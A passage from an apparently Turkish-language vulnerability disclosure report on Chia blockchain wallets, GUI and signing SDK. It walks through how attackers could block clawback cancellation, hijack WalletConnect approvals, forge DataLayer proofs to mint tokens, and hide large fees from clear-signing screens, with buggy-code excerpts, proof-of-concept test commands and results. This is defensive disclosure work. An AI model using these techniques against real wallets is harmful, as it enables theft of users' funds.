2. **Adım 2 — 24 Saatlik Clawback İptal Düğmesinin Kalıcı Olarak Kilitlenmesi (`t1_cold_reloaded_sqlite_spent: true`):** Kurban yanlış adrese veya dolandırıcıya gönderdiği `0.5 XCH` (`500,000,000,000 mojo`) tutarındaki Clawback korumasını iptal etmek istediğinde, cüzdan veritabanı soğuk yeniden başlatılsa bile coin'i 'zaten harcanmış' sandığı için iptal işlemi üretemez (`t2_sender_cancel_tx_count: 0`).
3. **Adım 3 — Süre Dolunca Saldırganın Gerçek Zincirdeki Parayı Çekmesi (`SpendBundle SHA-256: 33361e6b2d8ee0d9...`):** Coin gerçek blokzincirinde hiç harcanmadığı için, zaman kilidi dolduğu saniyede (`t4`) saldırgan geçerli `SpendBundle` (`930 bayt`) ile `0.5 XCH`'yi kendi cüzdanına çeker.

```python
# File: chia/wallet/wallet_node.py (lines 725-777) & wallet_state_manager.py (lines 1735-1778)
# BUG: Accepts RespondRemovals with proofs=None or unverified spent_height without Merkle proof verification
if not validate_removals(coin_Main, proofs, peak_header):
    # Missing fail-closed rejection before updating WalletCoinStore spent_height!
await self.coin_store.set_spent(coin_name, spent_height)
```

#### 3. Günlük Hayatta Yol Açabileceği 3 Kritik Senaryo (`Senaryo A / B / C`)
* **Senaryo A — 24 Saatlik Clawback (İptal) Korumasını Kilitleyip Süre Dolunca `0.5 XCH` (`500,000,000,000 mojo`) Çalmak:** Gönderici zaman kilitli Clawback ile `0.5 XCH` (`e088f25d...`) gönderir ve hatayı fark edip iptal etmek ister. Ancak saldırgan P2P üzerinden `RespondRemovals(height=8, proofs=None)` yollayarak göndericinin cüzdanında bu coin'i 'harcanmış' işaretler (`t1_cold_reloaded_sqlite_spent: true`). Gönderici süre boyunca iptal işlemi üretemez (`tx_count: 0`); süre dolunca saldırgan gerçek `SpendBundle` (`33361e6b2d8ee0d9...`) ile parayı çeker.
* **Senaryo B — Birleşik Zaman Çizelgesi Zinciri (`WLC-02` + `VR-01 / POC-10` — Hem Canlı Cüzdan İptalini Hem Acil Durum `chia-vault-recover` Aracını Aynı Anda Kilitleme):** Tek bir kesintisiz zaman çizelgesinde (`t0..t4`), saldırgan hem `WLC-02` ile canlı cüzdanı kilitler hem de `1 mojo` dust coin göndererek kurbanın son çare olarak çalıştırdığı `chia-vault-recover` CLI aracını sahte `launcher_id` (`2de44601...`) ile çökertir (`t3_poc10_matches_victim: false`).
* **Senaryo C — Borsa Sıcak Cüzdanları ve Likidasyon Botlarında UTXO Dondurma (DoS):** Harcanmamış coin'lerin yerel SQLite veritabanında `spent` işaretlenmesi, otomatik ödeme ve likidasyon botlarının bakiye kullanmasını engeller.

#### 4. Örnek Çalıştırma, Tetikleme ve Doğrulama Komutları
```bash
# 1. Inspect removal validation in chia/wallet/wallet_node.py and wallet_state_manager.py
sed -n '725,777p' /home/community-user/targets/chia-blockchain/chia/wallet/wallet_node.py

# 2. Run the Unified Timeline (t0..t4) & SQLite Cold-Reload Proof (RED & GREEN)
CHIA_DETACHED_GREEN=0 /home/community-user/targets/chia-blockchain/.venv/bin/pytest -q \
  /home/community-user/targets/chia-audit/work/composite-chain-proofs/test_chia_tam_dogrulama_ek_kanitlar_20261031.py -k wlc02
CHIA_DETACHED_GREEN=1 /home/community-user/targets/chia-blockchain/.venv/bin/pytest -q \
  /home/community-user/targets/chia-audit/work/composite-chain-proofs/test_chia_tam_dogrulama_ek_kanitlar_20261031.py -k wlc02
```
**Gözlemlenen Çalışma Zamanı Kanıtı (`RED -> GREEN`):**
```json
{
  "CHIA-WLC-02": {
    "RED": {
      "clawback_coin_id": "e088f25d50be49d29eb144248071f377d5f7bbdb5d7dd34078c9c72276a0b649",
      "clawback_amount_mojo": 500000000000,
      "t1_cold_reloaded_sqlite_spent": true,
      "t2_sender_cancel_tx_count": 0,
      "t3_poc10_matches_victim": false,
      "t4_recipient_claim_spend_bundle_sha256": "33361e6b2d8ee0d9bdd37738c4b2e54ece03c1eb507de8e59b370a1bd100e1e1",
      "t4_recipient_claim_bytes": 930
    },
    "GREEN": {
      "t1_cold_reloaded_sqlite_spent": false,
      "t2_sender_cancel_tx_count": 1,
      "t3_poc10_matches_victim": true,
      "sender_clawback_cancel_succeeded": true
    }
  }
}
```


---

### III.22 — Chia-Network/chia-blockchain-gui (`<= 2.6.1-rc2.dev60 (verified on commit 2f6ee83a23ac8b0370b96111e02f8edfb81fa1f3)`) — Chia Masaüstü Cüzdanı (`chia-blockchain-gui`) WalletConnect 29 Komutluk Yetki Açıklığı ve Eşzamanlı Onay Penceresi Ezme (`TOCTOU`) Zafiyeti (`GUI-WC-01`) (`CWE-367 / CWE-285`, CVSS `8.8 High`)

#### 1. Üst Veri & Bildirim Durumu
* **Hedef Depo & Paket:** `Chia-Network/chia-blockchain-gui` (`npm / TypeScript (Electron Desktop GUI): chia-blockchain-gui`)
* **Etkilenen Sürüm & Bileşenler:** `<= 2.6.1-rc2.dev60 (verified on commit 2f6ee83a23ac8b0370b96111e02f8edfb81fa1f3)` — `packages/gui/src/components/walletConnect/WalletConnectContext.tsx:314-441`, `constants/WalletConnectCommands.ts`
* **Zafiyet Sınıfı & Skor:** `CWE-367 / CWE-285` — **CVSS v3.1: `8.8 High`** (`CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:U/C:H/I:H/A:H`)
* **Sniper Tekil Raporu:** [`docs/advisories/tr/22-CHIA-GUI-WC-01-WALLETCONNECT-MODAL-OVERWRITE-TOCTOU.md`](advisories/tr/22-CHIA-GUI-WC-01-WALLETCONNECT-MODAL-OVERWRITE-TOCTOU.md)

#### 2. Açığın Kodda Nasıl Oluştuğu ve Zafiyete Dönüştüğü (Herkesin Anlayabileceği Adım Adım Anlatım)
1. **Adım 1 — Cüzdan Bağlandığında 29 Komutun Tamamına (Para Gönderme Dahil) Kapı Açılması (`WalletConnectCommands.ts`):** Günlük hayattan benzetmeyle *'Kimlik fotokopisi isteyen emlakçının arkadaki boş senetlere imza attırması'* gibidir. Kullanıcı bir NFT/ödül sitesine sadece adres doğrulamak için cüzdanını bağladığında, WalletConnect oturumu `chia_sendTransaction` (para gönderme) dahil 29 komutun tamamını aynı oturuma açar.
2. **Adım 2 — Arka Arkaya Gelen İki İstekle Onay Penceresinin Ezilmesi (`WalletConnectContext.tsx:314-441`):** Kodda gelen istekleri sıraya sokan bir FIFO kilidi yoktur. Web sitesi önce ekranda zararsız `chia_getCurrentAddress` (Adres Bilgisini Göster) penceresini açar, milisaniyeler içinde arka plandan `chia_sendTransaction` ateşler; kurban ekrandaki zararsız pencereyi onayladığı anda arka planda `0.5 XCH` (`500,000,000,000 mojo`) transferini içeren imzalı `SpendBundle` (`SHA-256: d2ce22645a9a23b1...`) üretilir ve cüzdan boşaltılır!
3. **Adım 3 — Onay Sonrası Cüzdan Parmak İzi / Ağ Bağlam Değişimi (`TOCTOU`):** İstek onaylandığı an ile `sendCommand` çalıştığı an arasında cüzdan parmak izi (`fingerprint`), ağ (`network`) ve eşleşme (`pairing`) bütünlüğü tekrar doğrulanmadığı için boş ikincil cüzdan (`fp=111111`) için verilen onay ana kasa cüzdanında (`fp=999999`) çalıştırılabilir.

```typescript
// File: packages/gui/src/components/walletConnect/WalletConnectContext.tsx (lines 314-441)
async function handleSessionRequest(event: SignClientTypes.EventArguments['session_request']) {
  // BUG 1: No FIFO mutex/queue serializing concurrent session_request events
  // BUG 2: No immutable binding of (requestId, method, paramsHash, fingerprint, network) in sendCommand
  const confirmed = await showConfirmationDialog(event);
  if (confirmed) {
    return await sendCommand(command, params);
  }
}
```

#### 3. Günlük Hayatta Yol Açabileceği 3 Kritik Senaryo (`Senaryo A / B / C`)
* **Senaryo A — 'Sadece Bakiyene/Adresine Bakacağım' Diyen Ödül Sitesinin Cüzdanı Boşaltması:** Kurban 'Ücretsiz Chia Ödül Kontrolü' sitesine masaüstü cüzdanını bağlar ve ekranda sadece `getCurrentAddress` (Adres Bilgisini Göster) penceresini görür. Bunu zararsız sanıp tıkladığı anda arka planda `chia_sendTransaction` çalışır ve `0.5 XCH` (`SpendBundle SHA-256: d2ce22645a9a23b165da6f3895d1139ed334a91aaef4e56d027f8b0c12754980`) saldırganın adresine akar.
* **Senaryo B — Boş Test Cüzdanından (`fp=111111`) Ana Hazinenin (`fp=999999`) Boşaltılması (`TOCTOU`):** Kurban siteye içinde para olmayan ikincil cüzdanını bağladığını düşünürken, onay ile yürütme arasındaki parmak izi (`fingerprint`) değişimi kontrol edilmediği için işlem ana cüzdan üzerinde imzalanır.
* **Senaryo C — Eşleşme Kapatıldıktan veya Ağ Değiştikten Sonra Asılı İsteğin Çalışması:** Onay penceresi açıkken oturum kesilse veya ağ değiştirilse bile yamasız kodda `sendCommand` çalışmaya devam eder (`GREEN` yaması 6 bağımsız WSS paketiyle tüm yarış ve bağlam değişimlerini reddeder).

#### 4. Örnek Çalıştırma, Tetikleme ve Doğrulama Komutları
```bash
# 1. Inspect handleSessionRequest and sendCommand in WalletConnectContext.tsx
sed -n '314,441p' /home/community-user/targets/chia-blockchain-gui/packages/gui/src/components/walletConnect/WalletConnectContext.tsx

# 2. Run the Live WSS Relay -> GUI Handler -> WalletRpcClient E2E Proof (RED & GREEN)
CHIA_DETACHED_GREEN=0 /home/community-user/targets/chia-blockchain/.venv/bin/pytest -q \
  /home/community-user/targets/chia-audit/work/composite-chain-proofs/test_chia_tam_dogrulama_ek_kanitlar_20261031.py -k gui_wc01
CHIA_DETACHED_GREEN=1 /home/community-user/targets/chia-blockchain/.venv/bin/pytest -q \
  /home/community-user/targets/chia-audit/work/composite-chain-proofs/test_chia_tam_dogrulama_ek_kanitlar_20261031.py -k gui_wc01
```
**Gözlemlenen Çalışma Zamanı Kanıtı (`RED -> GREEN`):**
```json
{
  "CHIA-GUI-WC-01": {
    "RED": {
      "displayed_prompt_method": "chia_getCurrentAddress",
      "concurrent_injected_method": "chia_sendTransaction",
      "modal_overwritten_by_second_request": true,
      "unauthorized_send_transaction_dispatched": true,
      "drained_amount_mojo": 500000000000,
      "signed_spend_bundle_sha256": "d2ce22645a9a23b165da6f3895d1139ed334a91aaef4e56d027f8b0c12754980"
    },
    "GREEN": {
      "distinct_wss_packets_tested": 6,
      "benign_get_current_address_succeeded": true,
      "benign_send_transaction_succeeded": true,
      "concurrent_modal_overwrite_rejected": true,
      "fingerprint_network_pairing_switch_rejected": true,
      "unknown_method_rejected": true
    }
  }
}
```


---

### III.23 — Chia-Network/chia-blockchain (`<= 2.7.5 (verified on commit bdb7be2a45fc459b0672656166701ac4f46e0cfc)`) — Chia DataLayer `WalletRpcApi.dl_verify_proof` İçinde Singleton Soy Kütüğü Doğrulama Eksikliği İle `1 Mojo`'luk Sahte Kanıt Üretimi ve Zincir Üstünde `100.000 CAT` Token Basımı (`DL-01`) (`CWE-347 / CWE-345`, CVSS `9.1 Critical`)

#### 1. Üst Veri & Bildirim Durumu
* **Hedef Depo & Paket:** `Chia-Network/chia-blockchain` (`PyPI / Python: chia-blockchain`)
* **Etkilenen Sürüm & Bileşenler:** `<= 2.7.5 (verified on commit bdb7be2a45fc459b0672656166701ac4f46e0cfc)` — `chia/rpc/wallet_rpc_api.py:4066-4120` (`dl_verify_proof`), `chia/data_layer/data_layer_util.py`
* **Zafiyet Sınıfı & Skor:** `CWE-347 / CWE-345` — **CVSS v3.1: `9.1 Critical`** (`CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:C/C:N/I:H/A:N`)
* **Sniper Tekil Raporu:** [`docs/advisories/tr/23-CHIA-DL-01-DATALAYER-VERIFY-PROOF-NON-SINGLETON-FORGERY-CAT-MINT.md`](advisories/tr/23-CHIA-DL-01-DATALAYER-VERIFY-PROOF-NON-SINGLETON-FORGERY-CAT-MINT.md)

#### 2. Açığın Kodda Nasıl Oluştuğu ve Zafiyete Dönüştüğü (Herkesin Anlayabileceği Adım Adım Anlatım)
1. **Adım 1 — `WalletRpcApi.dl_verify_proof` İçinde Coin'in Gerçek Singleton Olup Olmadığının Kontrol Edilmemesi (`chia/rpc/wallet_rpc_api.py:4066-4120`):** Chia DataLayer, kurumların zincir üstünde resmi veri kayıtları (karbon kredisi sicili, RWA teminat tablosu, köprü rezerv kaydı) tuttuğu sistemdir. `dl_verify_proof` RPC'si kendisine verilen kanıttaki coin'in zincirde var olduğunu ve Merkle kökünü kontrol eder; ancak **bu coin'in gerçekten o kurumun resmi DataLayer Singleton'ı (`match_dl_singleton` ve `store_id` soy kütüğü) olup olmadığını hiç kontrol etmez!**
2. **Adım 2 — `1 Mojo` Maliyetle Herhangi Bir Kurumun `store_id` Kaydı Adına Sahte Kanıt Üretilmesi:** Saldırgan cebinden sadece `1 mojo` (trilyonda bir XCH) harcayarak sıradan (singleton olmayan) bir coin (`86ec0dd71fbc7e41...`) oluşturur ve içine hedef kurumun `store_id` (`806a6c73c7344b24...`) kimliğini yazar. `WalletRpcApi.dl_verify_proof` bu sahte kanıta `{"verified": true, "current_root": true}` (Tamamen Geçerli ve Güncel!) yanıtı döner.
3. **Adım 3 — Zincir Üstünde (On-Chain) `100.000 Adet Gerçek CAT Token` Basılması (`SpendBundle SHA-256: 6a635760183480c0...`):** `dl_verify_proof` onayına güvenen RWA/köprü servisi, gerçek Chia zinciri üzerinde `CATWallet` (`cat_asset_id: 73dc2527f5a75964...`) çalıştırarak saldırganın cüzdanına **`100.000 CAT` (`100,000,000 CAT mojo`)** basar ve transfer eder (`dc3f0bbaac81e982...`).

```python
# File: chia/rpc/wallet_rpc_api.py (lines 4066-4120)
async def dl_verify_proof(self, request: dict[str, Any]) -> EndpointResult:
    proof = DLProof.from_json_dict(request)
    verified_clvm_hashes = dl_verify_proof(proof)
    # BUG: Verifies coin existence and Merkle hash, but NEVER verifies that the parent coin spend
    # matches SINGLETON_TOP_LAYER_MOD with launcher_id == proof.store_proofs.store_id!
```

#### 3. Günlük Hayatta Yol Açabileceği 3 Kritik Senaryo (`Senaryo A / B / C`)
* **Senaryo A — `1 Mojo`'luk Sahte DataLayer Kanıtıyla Zincir Üstünde `100.000 CAT` (`100,000,000 CAT mojo`) Basıp Çekmek:** Kurumsal bir RWA/Stablecoin ihraççısı, `1.000 XCH` teminatlı kasasının ihraç onaylarını DataLayer `store_id = 806a6c73c7344b24...` üzerinde tutmaktadır. Saldırgan yalnızca `1 mojo` harcayarak sıradan bir coin (`86ec0dd71fbc7e41...`) içinde sahte Merkle kökü yayınlar ve kanıtı `WalletRpcApi.dl_verify_proof` uç noktasına verir. Cüzdan RPC'si `verified: true, current_root: true` döndürdüğü için sistem saldırganın cüzdanına zincir üstünde gerçek **`100.000 CAT` token** (`cat_asset_id: 73dc2527...`, `SpendBundle: dc3f0bbaac81e982...`) basar.
* **Senaryo B — Doğrudan `WalletRpcApi.dl_verify_proof` Üzerinde Yan Yana Kanıt (`Gerçek Singleton` vs `1-Mojo Sahte Coin`):** Hiçbir harici köprü olmadan doğrudan Chia'nın kendi `WalletRpcApi.dl_verify_proof` metoduna gerçek Singleton kanıtı ile `1 mojo` sahte coin kanıtı yan yana verildiğinde, yamasız (`RED`) kod her ikisine de `verified: true` döner; yamalı (`GREEN`) kod ise sahte kanıtı `ProofIntegrityError` ile reddeder.
* **Senaryo C — Sahte Karbon Kredisi ve Tedarik Zinciri Sertifikası Doğrulama:** Resmi karbon sicilinin `store_id` kimliği kullanılarak `1 mojo` ile sahte sertifika kanıtı doğrulatılır.

#### 4. Örnek Çalıştırma, Tetikleme ve Doğrulama Komutları
```bash
# 1. Inspect WalletRpcApi.dl_verify_proof in chia/rpc/wallet_rpc_api.py
sed -n '4066,4120p' /home/community-user/targets/chia-blockchain/chia/rpc/wallet_rpc_api.py

# 2. Run both the Intrinsic Side-by-Side RPC Test and the 100,000 CAT On-Chain Mint Test (RED & GREEN)
CHIA_DETACHED_GREEN=0 /home/community-user/targets/chia-blockchain/.venv/bin/pytest -q \
  /home/community-user/targets/chia-audit/work/composite-chain-proofs/test_chia_tam_dogrulama_ek_kanitlar_20261031.py -k dl01
CHIA_DETACHED_GREEN=1 /home/community-user/targets/chia-blockchain/.venv/bin/pytest -q \
  /home/community-user/targets/chia-audit/work/composite-chain-proofs/test_chia_tam_dogrulama_ek_kanitlar_20261031.py -k dl01
```
**Gözlemlenen Çalışma Zamanı Kanıtı (`RED -> GREEN`):**
```json
{
  "CHIA-DL-01": {
    "RED": {
      "victim_store_id": "806a6c73c7344b24d23915a319f82da69e1129a70e3ef772da2be14de2b4a5d6",
      "forged_non_singleton_coin_id": "86ec0dd71fbc7e415e06dc504e8e74436cf4f60d2f4ab942fc2104685b20dd17",
      "dl_verify_proof_verified": true,
      "dl_verify_proof_current_root": true,
      "cat_asset_id": "73dc2527f5a75964c9b1b019def41d17aaa1f22d42235f479114c2e505f679f5",
      "cat_issuance_spend_bundle_sha256": "6a635760183480c0c94ccf7786c1700fa5b7d7b0ae2532da49ff22edc3257c5e",
      "cat_delivery_spend_bundle_sha256": "dc3f0bbaac81e982baa174241b3a69fba1b8a34e7033d8e1465ecd832ea18196",
      "attacker_minted_cat_mojo": 100000000,
      "attacker_minted_cat_tokens": 100000
    },
    "GREEN": {
      "canonical_singleton_proof_verified": true,
      "counterfeit_non_singleton_proof_verified": false,
      "attacker_minted_cat_mojo": 0
    }
  }
}
```


---

### III.24 — Chia-Network/cni-wallet-sdk (`chia-sdk-driver <= 0.36.0 / workspace <= 0.38.0 (commit e8951e21ece7bfa7a1534e35319bc4a32ddc589d)`) — `cni-wallet-sdk` Clear-Signing (Şeffaf İmzalama) Motorunda `Condition::Other` Atlama Hatası İle Ekranda `0 Ücret` Gösterip `750 XCH` Çalma ve NFT Durumunu Değiştirme (`CS-01` / `POC-1 & POC-2`) (`CWE-451 / CWE-345`, CVSS `8.6 High`)

#### 1. Üst Veri & Bildirim Durumu
* **Hedef Depo & Paket:** `Chia-Network/cni-wallet-sdk` (`Cargo / Rust (Chia Mobile & Hardware Clear-Signing SDK): chia-sdk-driver`)
* **Etkilenen Sürüm & Bileşenler:** `chia-sdk-driver <= 0.36.0 / workspace <= 0.38.0 (commit e8951e21ece7bfa7a1534e35319bc4a32ddc589d)` — `crates/chia-sdk-driver/src/clear_signing.rs`, `crates/chia-sdk-driver/src/clear_signing/tests.rs`
* **Zafiyet Sınıfı & Skor:** `CWE-451 / CWE-345` — **CVSS v3.1: `8.6 High`** (`CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:U/C:N/I:H/A:H`)
* **Sniper Tekil Raporu:** [`docs/advisories/tr/24-CHIA-CS-01-CLEAR-SIGNING-NON-CANONICAL-CONDITION-OTHER-FEE-DRAIN.md`](advisories/tr/24-CHIA-CS-01-CLEAR-SIGNING-NON-CANONICAL-CONDITION-OTHER-FEE-DRAIN.md)

#### 2. Açığın Kodda Nasıl Oluştuğu ve Zafiyete Dönüştüğü (Herkesin Anlayabileceği Adım Adım Anlatım)
1. **Adım 1 — Konsensüs Motoru (`chia_rs`) İle Clear-Signing Ayrıştırıcısı Arasındaki Uyumsuzluk (`clear_signing.rs`):** Chia konsensüs motoru CLVM koşullarının sonuna fazladan bir atom eklendiğinde (örneğin `(52 750_XCH extra_atom)`) bunu geçerli bir `RESERVE_FEE` komutu olarak çalıştırır. Buna karşılık `cni-wallet-sdk` sabit uzunluklu ayrıştırıcı kullandığı için bu koşulu `Condition::Other` olarak sınıflandırır ve hata vermeden yok sayar!
2. **Adım 2 — İmza Ekranında `Ücret: 0 XCH` Gösterip Arka Planda `750 XCH` (`750,000,000,000,000 mojo`) Çekilmesi (`POC-1`):** `b9b614d01ee2b104325a7dde22c33c498ed9e2e6925f957411d9d9d162f06e5c` (`1.105 bayt`) özetli gerçek `SpendBundle` içinde `750 XCH` tutarındaki çıkış `Condition::Other` içine saklanır; donanım/mobil cüzdan ekranında kullanıcıya `reserved_fee: 0` gösterilirken işlem imzalandığında `750 XCH` kasadan çıkar.
3. **Adım 3 — NFT `-24` Transfer Programı ve Durum Değişikliğinin Gizlenmesi (`POC-2`):** `17d2796f8bd6b9bf9fc1f03cb0570be6ac6393215c27cf61718b2eb9924dd128` (`3.274 bayt`) özetli `SpendBundle` içinde NFT durumunu değiştiren koşul Clear-Signing özetinde gizlenirken zincir üstünde yürütülür.

```rust
// File: crates/chia-sdk-driver/src/clear_signing.rs
// BUG: Condition::Other(_) variants (such as overlong RESERVE_FEE opcode 52 or unparsed NFT opcodes)
// are silently ignored instead of returning Error::UnsupportedCondition / failing closed:
match condition {
    Condition::ReserveFee(fee) => reserved_fee += fee.amount,
    Condition::Other(_) => { /* silently ignored in unpatched RED! */ }
}
```

#### 3. Günlük Hayatta Yol Açabileceği 3 Kritik Senaryo (`Senaryo A / B / C`)
* **Senaryo A — Kurumsal Kasadan (Chia Vault) Ekranda `0 Ücret` Göstererek `750 XCH` (`750,000,000,000,000 mojo`) Boşaltma (`POC-1`):** Kasa yöneticisi rutin bir işlem imzalarken Clear-Signing ekranında `reserved_fee = 0` görür ve imzalar (`SpendBundle SHA-256: b9b614d01ee2b104...`); ancak işlem zincire girdiğinde `750 XCH` gizli ücret olarak kasadan çekilir.
* **Senaryo B — NFT Transfer Programı ve Durumunun Gizlice Ele Geçirilmesi (`POC-2`):** Kullanıcı zararsız görünen bir NFT işlemini (`SpendBundle SHA-256: 17d2796f8bd6b9bf...`) imzalarken, `Condition::Other` olarak atlanan koşul zincir üstünde NFT'nin kontrolünü değiştirir.
* **Senaryo C — Yamalı (`GREEN`) Davranış:** `CHIA-CNI-WALLET-SDK-CLEAR-SIGNING-FIXES-20261030.patch` uygulandığında `Condition::Other` içeren her iki `SpendBundle` da imzalanmadan önce deterministik olarak reddedilir.

#### 4. Örnek Çalıştırma, Tetikleme ve Doğrulama Komutları
```bash
# 1. Run the Clear-Signing Rust Proof Suite in cni-wallet-sdk (POC-1 & POC-2)
cargo test --manifest-path /home/community-user/targets/cni-wallet-sdk/Cargo.toml \
  -p chia-sdk-driver clear_signing::tests::test_poc1_and_poc2 -- --nocapture
```
**Gözlemlenen Çalışma Zamanı Kanıtı (`RED -> GREEN`):**
```json
{
  "CHIA-CS-01": {
    "RED": {
      "poc1_spend_bundle_sha256": "b9b614d01ee2b104325a7dde22c33c498ed9e2e6925f957411d9d9d162f06e5c",
      "poc1_spend_bundle_bytes": 1105,
      "poc1_clear_signing_displayed_fee_mojo": 0,
      "poc1_consensus_drained_fee_mojo": 750000000000000,
      "poc2_spend_bundle_sha256": "17d2796f8bd6b9bf9fc1f03cb0570be6ac6393215c27cf61718b2eb9924dd128",
      "poc2_spend_bundle_bytes": 3274
    },
    "GREEN": {
      "poc1_rejected_fail_closed": true,
      "poc2_rejected_fail_closed": true,
      "patch_sha256": "d92c4b9d9856f59e1d676468a2966bf7a474aa82efcb657c9ec3ecd8ad000e27"
    }
  }
}
```


---

### III.25 — Chia-Network/cni-wallet-sdk (`chia-sdk-driver <= 0.36.0 / workspace <= 0.38.0 (commit e8951e21ece7bfa7a1534e35319bc4a32ddc589d)`) — `cni-wallet-sdk` Clear-Signing NFT `NEW_METADATA_INFO` Güncelleyici Koşullarının Denetlenmemesi Nedeniyle Gizli `500 XCH` Çıkışı (`CS-02` / `POC-3`) (`CWE-451 / CWE-345`, CVSS `8.1 High`)

#### 1. Üst Veri & Bildirim Durumu
* **Hedef Depo & Paket:** `Chia-Network/cni-wallet-sdk` (`Cargo / Rust (Chia Mobile & Hardware Clear-Signing SDK): chia-sdk-driver`)
* **Etkilenen Sürüm & Bileşenler:** `chia-sdk-driver <= 0.36.0 / workspace <= 0.38.0 (commit e8951e21ece7bfa7a1534e35319bc4a32ddc589d)` — `crates/chia-sdk-driver/src/clear_signing.rs` (`NEW_METADATA_INFO` evaluation)
* **Zafiyet Sınıfı & Skor:** `CWE-451 / CWE-345` — **CVSS v3.1: `8.1 High`** (`CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:U/C:N/I:H/A:N`)
* **Sniper Tekil Raporu:** [`docs/advisories/tr/25-CHIA-CS-02-CLEAR-SIGNING-NFT-METADATA-UPDATER-HIDDEN-FEE.md`](advisories/tr/25-CHIA-CS-02-CLEAR-SIGNING-NFT-METADATA-UPDATER-HIDDEN-FEE.md)

#### 2. Açığın Kodda Nasıl Oluştuğu ve Zafiyete Dönüştüğü (Herkesin Anlayabileceği Adım Adım Anlatım)
1. **Adım 1 — NFT Katmanının Metadata Güncelleyici Programdan Dönen Koşulları Çalıştırması:** Chia NFT standardında `NEW_METADATA_INFO` (`-24`) koşulu çalıştırıldığında, metadata güncelleyici programın döndürdüğü ek CLVM koşulları da konsensüs tarafından doğrudan yürütülür.
2. **Adım 2 — Clear-Signing Motorunun Metadata Güncelleyiciden Dönen `RESERVE_FEE` Koşulunu Yok Sayması (`clear_signing.rs`):** `cni-wallet-sdk` yalnızca yeni metadata bilgisini okur, ancak güncelleyici programın döndürdüğü `500 XCH` (`500,000,000,000,000 mojo`) tutarındaki `RESERVE_FEE` koşulunu toplam çıkış/ücret hesabına katmaz.
3. **Adım 3 — Ekranda `Ücret: 0 XCH` Görünen NFT Güncellemesiyle `500 XCH` Boşaltılması (`SpendBundle SHA-256: b314b6d7411bfb8a...`):** Kullanıcı `3.300 bayt` boyutundaki `SpendBundle` işlemini ücretsiz bir NFT metadata güncellemesi sanarak imzalar; işlem ağa girdiğinde `500 XCH` kasadan çekilir.

```rust
// File: crates/chia-sdk-driver/src/clear_signing.rs
// BUG: Evaluates NEW_METADATA_INFO metadata updater program for metadata diff,
// but ignores extra consensus conditions (e.g. RESERVE_FEE 500 XCH) returned by the updater!
```

#### 3. Günlük Hayatta Yol Açabileceği 3 Kritik Senaryo (`Senaryo A / B / C`)
* **Senaryo A — 'Ücretsiz NFT Özelliği Güncelleme' İşlemiyle Kasadan `500 XCH` (`500,000,000,000,000 mojo`) Çekilmesi:** Kullanıcı imza ekranında `reserved_fee = 0` gördüğü NFT işlemini (`SpendBundle SHA-256: b314b6d7411bfb8a...`) onaylar; ancak metadata güncelleyici içindeki gizli `RESERVE_FEE` koşulu yüzünden `500 XCH` kaybeder.
* **Senaryo B — Özel Metadata Güncelleyicili Tuzak NFT Transferi:** Saldırgan içine tuzaklı metadata güncelleyici yerleştirdiği bir NFT'yi hedef kasaya gönderir; kasa NFT üzerinde işlem yaptığında gizli ücret koşulu tetiklenir.
* **Senaryo C — Yamalı (`GREEN`) Doğrulama:** Yama sonrasında metadata güncelleyicinin ekstra konsensüs koşulu üretmesi deterministik olarak reddedilir.

#### 4. Örnek Çalıştırma, Tetikleme ve Doğrulama Komutları
```bash
# 1. Run POC-3 (500 XCH NFT Metadata Updater Hidden Fee) in cni-wallet-sdk
cargo test --manifest-path /home/community-user/targets/cni-wallet-sdk/Cargo.toml \
  -p chia-sdk-driver clear_signing::tests::test_poc3 -- --nocapture
```
**Gözlemlenen Çalışma Zamanı Kanıtı (`RED -> GREEN`):**
```json
{
  "CHIA-CS-02": {
    "RED": {
      "poc3_spend_bundle_sha256": "b314b6d7411bfb8a87bd4b091a117b861e5a171ed4a0a4712955c592962042e6",
      "poc3_spend_bundle_bytes": 3300,
      "clear_signing_displayed_fee_mojo": 0,
      "consensus_drained_fee_mojo": 500000000000000
    },
    "GREEN": {
      "poc3_rejected_fail_closed": true,
      "patch_sha256": "d92c4b9d9856f59e1d676468a2966bf7a474aa82efcb657c9ec3ecd8ad000e27"
    }
  }
}
```


---

### III.26 — Chia-Network/cni-wallet-sdk (`chia-sdk-driver <= 0.36.0 / workspace <= 0.38.0 (commit e8951e21ece7bfa7a1534e35319bc4a32ddc589d)`) — `cni-wallet-sdk` Clear-Signing Bağımlı Teklif (Offer) Bacaklarında Kesişim (`Intersection`) Hatası İle `500 XCH` Ödeme Çıkışının Gizlenmesi (`CS-03` / `POC-4`) (`CWE-682 / CWE-451`, CVSS `8.6 High`)

#### 1. Üst Veri & Bildirim Durumu
* **Hedef Depo & Paket:** `Chia-Network/cni-wallet-sdk` (`Cargo / Rust (Chia Mobile & Hardware Clear-Signing SDK): chia-sdk-driver`)
* **Etkilenen Sürüm & Bileşenler:** `chia-sdk-driver <= 0.36.0 / workspace <= 0.38.0 (commit e8951e21ece7bfa7a1534e35319bc4a32ddc589d)` — `crates/chia-sdk-driver/src/clear_signing.rs` (dependent offer leg aggregation)
* **Zafiyet Sınıfı & Skor:** `CWE-682 / CWE-451` — **CVSS v3.1: `8.6 High`** (`CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:U/C:N/I:H/A:N`)
* **Sniper Tekil Raporu:** [`docs/advisories/tr/26-CHIA-CS-03-CLEAR-SIGNING-OFFER-SET-INTERSECTION-OUTFLOW-OMISSION.md`](advisories/tr/26-CHIA-CS-03-CLEAR-SIGNING-OFFER-SET-INTERSECTION-OUTFLOW-OMISSION.md)

#### 2. Açığın Kodda Nasıl Oluştuğu ve Zafiyete Dönüştüğü (Herkesin Anlayabileceği Adım Adım Anlatım)
1. **Adım 1 — Çok Bacaklı Teklif (Offer) Hesaplamasında Kesişim (`Intersection`) Kullanılması (`clear_signing.rs`):** Bir kasa işlemi birden fazla bağımlı settlement (takas) bacağı içerdiğinde (`POC-4`), `cni-wallet-sdk` tüm ödemelerin birleşimini (`union`) almak yerine kümelerin kesişimini alır.
2. **Adım 2 — İkinci Bacaktaki `500 XCH` (`500,000,000,000,000 mojo`) Ödemenin İmza Ekranından Düşmesi:** Kasa harcaması (`3c55638a605214af...`) ve settlement harcaması (`7c05b725fb43d8fa...`) birleştiğinde, saldırgana giden `500 XCH` tutarındaki bacak kesişim kümesinde yer almadığı için Clear-Signing özetinden tamamen silinir.
